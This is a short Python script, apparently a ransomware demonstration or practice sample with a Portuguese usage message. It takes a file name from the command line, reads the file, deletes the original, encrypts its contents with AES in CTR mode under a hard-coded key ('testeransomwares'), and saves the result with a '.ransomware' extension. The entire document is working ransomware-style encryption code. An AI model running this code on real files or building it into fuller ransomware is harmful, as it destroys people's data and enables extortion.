import os
import pyaes
import sys

if len(sys.argv) <= 1:
    print('Modo de uso python encrypter.py FILENAME')
else:
    file_name = (sys.argv[1])
    file = open(file_name, 'rb')
    file_data = file.read()
    file.close()

    ## remove file
    os.remove(file_name)

    ## key
    key = b"testeransomwares"
    aes = pyaes.AESModeOfOperationCTR(key)

    ## criptography
    crypto_data = aes.encrypt(file_data)

    ## create file
    new_file = file_name + '.ransomware'
    new_file = open(f'{new_file}', 'wb')
    new_file.write(crypto_data)
    new_file.close()